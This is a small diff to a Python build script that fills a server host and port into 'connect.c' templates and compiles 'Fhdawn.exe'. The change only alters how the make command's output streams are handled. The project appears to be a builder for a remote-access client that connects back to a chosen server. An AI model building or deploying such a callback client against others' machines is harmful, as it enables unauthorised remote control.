@@ -6,7 +6,7 @@ def Build(host, port):
     os.chdir("fhdawn")
     inplace_change("connect.c", "{{serverhost}}", host)
     inplace_change("connect.c", "{{serverport}}", port)
-    subprocess.call(["make"])
+    subprocess.call(["make"], stderr=subprocess.STDOUT, stdout=None)
     if(os.path.isfile("Fhdawn.exe")):
         print("[+] Built : {x}".format(x = os.path.abspath("Fhdawn.exe")))
     else:
